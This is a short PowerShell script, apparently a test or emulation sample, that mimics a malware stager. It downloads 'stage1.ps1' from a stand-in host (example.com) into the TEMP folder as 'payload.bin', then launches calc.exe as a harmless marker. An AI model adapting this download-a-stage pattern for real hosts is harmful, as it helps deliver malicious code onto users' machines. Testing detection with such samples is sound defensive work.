[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://example.com:80/stage1.ps1',
    [string]$LocalPath = "$env:TEMP\payload.bin",
    [int]$TransferTimeout = 12
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-18"
